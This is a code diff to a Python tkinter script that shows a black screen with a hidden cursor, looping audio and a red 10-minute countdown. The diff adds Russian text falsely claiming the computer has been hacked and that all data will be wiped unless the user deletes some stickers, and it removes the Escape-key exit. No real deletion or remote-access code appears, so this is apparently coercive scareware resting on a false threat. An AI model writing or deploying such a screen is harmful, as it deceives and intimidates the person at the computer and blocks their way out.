@@ -7,41 +7,51 @@ def main():
     root.configure(bg="black")
     root.config(cursor="none")             # скрыть курсор
 
-    # Основная надпись
-    label = tk.Label(
+    label_big = tk.Label(
         root,
         text="УДАЛИ СТИКЕРЫ",
-        font=("Arial", 80, "bold"),
+        font=("Arial", 100, "bold"),
         fg="red",
         bg="black"
     )
-    label.pack(expand=True)
+    label_big.pack(pady=50)
 
-    # Таймер ниже текста
+    label_small = tk.Label(
+        root,
+        text="Я ТЕБЯ ВЗЛОМАЛ!\n"
+             "ФАЙЛЫ ДИСТАНЦИОННОГО УПРАВЛЕНИЯ УЖЕ В СИСТЕМЕ,\n"
+             "У ТЕБЯ 10 МИНУТ!!!\n"
+             "НЕ УДАЛИШЬ СТИКЕРЫ, ВСЕ ДАННЫЕ С ПК БУДУТ УДАЛЕНЫ!!!\n"
+             "\n"
+             "ХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХА\n"
+             "ХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХА\n"
+             "ХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХА\n"
+             "ХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХАХА",
+        font=("Arial", 40, "bold"),
+        fg="red",
+        bg="black",
+        justify="center"
+    )
+    label_small.pack(pady=5)
+
     timer_label = tk.Label(
         root,
         text="10:00",
-        font=("Arial", 50, "bold"),
-        fg="white",
+        font=("Arial", 100, "bold"),
+        fg="red",
         bg="black"
     )
-    timer_label.pack(pady=50)
+    timer_label.pack(pady=90)
 
-    # Звук при старте
     winsound.PlaySound("Slaughterhouse.wav", winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
 
-    # Логика таймера
     def countdown(time_left):
         mins, secs = divmod(time_left, 60)
         timer_label.config(text=f"{mins:02d}:{secs:02d}")
         if time_left > 0:
             root.after(1000, countdown, time_left - 1)
 
-    countdown(10 * 60)  # 10 минут в секундах
-
-    # Выход только по ESC
-    root.bind("<Escape>", lambda e: root.destroy())
-
+    countdown(10 * 60)
     root.mainloop()
 
 if __name__ == "__main__":
